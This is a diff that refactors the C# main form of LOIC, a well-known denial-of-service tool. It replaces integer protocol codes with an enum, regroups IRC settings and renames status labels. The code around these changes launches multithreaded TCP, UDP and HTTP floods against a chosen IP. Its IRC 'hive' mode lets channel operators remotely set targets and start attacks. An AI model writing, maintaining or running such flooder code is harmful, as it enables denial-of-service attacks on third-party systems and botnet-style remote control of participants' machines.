@@ -17,7 +17,8 @@ namespace LOIC
 		private static XXPFlooder[] xxp;
 		private static HTTPFlooder[] http;
 		private static string sHost, sIP, sMethod, sData, sSubsite;
-		private static int iPort, iThreads, iProtocol, iDelay, iTimeout;
+		private static int iPort, iThreads, iDelay, iTimeout;
+	    private static Protocol protocol;
 		private static bool bResp, intShowStats;
 		private IrcClient irc;
 		private Thread irclisten;
@@ -25,24 +26,13 @@ namespace LOIC
 		private static bool ircenabled;
 		private Dictionary<string, string> OpList;
 		private delegate void CheckParamsDelegate(List<string> pars);
-		public frmMain(bool hive, bool hide, string ircserver, string ircport, string ircchannel)
+        public frmMain(bool hive, bool hide, IrcData ircData)
 		{
 			InitializeComponent();
 			//IRC
-			if (ircserver != "")
-			{
-			    txtIRCserver.Text = ircserver;
-			}
-			if (ircport != "")
-			{
-			    txtIRCport.Text = ircport;
-			}
-			if (ircchannel != "")
-			{
-			    txtIRCchannel.Text = ircchannel;
-			}
+            ShowIrcData(ircData);
 
-			//Lets try this!
+            //Lets try this!
 			if ( hide )
 			{
 			    this.WindowState = FormWindowState.Minimized;
@@ -50,11 +40,33 @@ namespace LOIC
 			}
 
 			this.FormClosing += frmMain_Closing;
-			if (hive) enableHive.Checked = true;
-			if (!hive) disableHive.Checked = true;
+
+            enableHive.Checked = hive;
+            disableHive.Checked = !hive;
         }
 
-        private const string ChargingString = "IMMA CHARGIN MAH LAZER";
+	    private void ShowIrcData(IrcData ircData)
+	    {
+            if (ircData == null)
+            {
+                return;
+            }
+
+	        if (! string.IsNullOrEmpty(ircData.Server))
+	        {
+	            txtIRCserver.Text = ircData.Server;
+	        }
+	        if (! string.IsNullOrEmpty(ircData.Port))
+	        {
+	            txtIRCport.Text = ircData.Port;
+	        }
+	        if (! string.IsNullOrEmpty(ircData.Channel))
+	        {
+	            txtIRCchannel.Text = ircData.Channel;
+	        }
+	    }
+
+	    private const string ChargingString = "IMMA CHARGIN MAH LAZER";
 
         private void Attack(bool toggle, bool on, bool silent)
         {
@@ -104,20 +116,20 @@ namespace LOIC
                     }					
 
                     sMethod = cbMethod.Text;
-                    iProtocol = ReadProtocolIndex(cbMethod.Text);
-                    if (iProtocol == 0)
+                    protocol = ProtocolHelper.Read(cbMethod.Text);
+                    if (protocol == Protocol.Unknown)
                     {
                         throw new Exception("Select a proper attack method.");
                     }
 
                     sData = txtData.Text.Replace("\\r", "\r").Replace("\\n", "\n");
-                    if (String.IsNullOrEmpty(sData) && (iProtocol == 1 || iProtocol == 2))
+                    if (String.IsNullOrEmpty(sData) && (protocol == Protocol.Tcp || protocol == Protocol.Udp))
                     {
                         throw new Exception("Gonna spam with no contents? You're a wise fellow, aren't ya? o.O");
                     }
 
                     sSubsite = txtSubsite.Text;
-                    if (!sSubsite.StartsWith("/") && (iProtocol == 3))
+                    if (!sSubsite.StartsWith("/") && (protocol == Protocol.Http))
                     {
                         throw new Exception("You have to enter a subsite (for example \"/\")");
                     }
@@ -145,7 +157,7 @@ namespace LOIC
                     xxp = new XXPFlooder[iThreads];
                     for (int a = 0; a < xxp.Length; a++)
                     {
-                        xxp[a] = new XXPFlooder(sIP, iPort, iProtocol, iDelay, bResp, sData, chkMsgRandom.Checked);
+                        xxp[a] = new XXPFlooder(sIP, iPort, protocol, iDelay, bResp, sData, chkMsgRandom.Checked);
                         xxp[a].Start();
                     }
                 }
@@ -181,21 +193,6 @@ namespace LOIC
                 //tShowStats.Stop();
             }
         }
-
-        private static int ReadProtocolIndex(string method)
-	    {
-            switch (method)
-            {
-                case "TCP":
-                    return 1;
-                case "UDP":
-                    return 2;
-                case "HTTP":
-                    return 3;                    
-                default:
-                    return 0;
-            }
-	    }
 
 	    private void LockOnIp(bool silent)
         {
@@ -260,7 +257,7 @@ namespace LOIC
                 ircenabled = enabled;
                 if (enabled)
                 {
-                    label25.Text = "Connecting..";
+                    lblConnectionStatus.Text = "Connecting..";
                     irc = new IrcClient();
                     irc.OnConnected += IrcConnected;
                     irc.OnReadLine += OnReadLine;
@@ -287,7 +284,7 @@ namespace LOIC
                         // irc.WriteLine(Rfc2812.User("loic", 0, "ACSLaw"),Priority.Critical);
                         irc.Login("LOIC_" + Functions.RandomString(), "Newfag's remote LOIC", 0, "IRCLOIC");
 
-                        //Spawn a fuckign thread to handle the listen.. why!?!?
+                        //Spawn a fucking thread to handle the listen.. why!?!?
                         irclisten = new Thread(IrcListenThread);
                         irclisten.Start();
                     }
@@ -302,7 +299,7 @@ namespace LOIC
                     }
                     catch
                     { }
-                    label25.Text = "Disconnected.";
+                    lblConnectionStatus.Text = "Disconnected.";
                 }
             }
             catch
@@ -332,7 +329,7 @@ namespace LOIC
         }
         private void IrcConnected(object o, EventArgs e)
         {
-            label25.Text = "Logging In...";
+            lblConnectionStatus.Text = "Logging In...";
         }
         void OnNames(object sender, NamesEventArgs e)
         {
@@ -440,13 +437,13 @@ namespace LOIC
         private delegate void SetStatusDelegate(string status);
         void SetStatus(string status)
         {
-            if (label25.InvokeRequired)
+            if (lblConnectionStatus.InvokeRequired)
             {
-                label25.Invoke(new SetStatusDelegate(SetStatus), status);
+                lblConnectionStatus.Invoke(new SetStatusDelegate(SetStatus), status);
             }
             else
             {
-                label25.Text = status;
+                lblConnectionStatus.Text = status;
             }
         }
         void OnMessage(object sender, IrcEventArgs e)
@@ -459,7 +456,7 @@ namespace LOIC
                     if (OpList != null && OpList.ContainsKey(e.Data.Nick))
                     {
                         List<string> pars = new List<string>(e.Data.Message.Split(' '));
-                        SetStatus("Controlled by "+e.Data.Nick);
+                        SetStatus("Controlled by " + e.Data.Nick);
                         try
                         {
                             txtTargetIP.Invoke(new CheckParamsDelegate(CheckParams), pars);
@@ -634,7 +631,7 @@ namespace LOIC
 
 			bool isFlooding = false;
 			if (cmdAttack.Text == "Stop for now") isFlooding = true;
-			if (iProtocol == 1 || iProtocol == 2)
+            if (protocol == Protocol.Tcp || protocol == Protocol.Udp)
 			{
 				int iFloodCount = 0;
 				for (int a = 0; a < xxp.Length; a++)
@@ -643,7 +640,7 @@ namespace LOIC
 				}
 				lbRequested.Text = iFloodCount.ToString();
 			}
-			if (iProtocol == 3)
+			else if (protocol == Protocol.Http)
 			{
 				int iIdle = 0;
 				int iConnecting = 0;
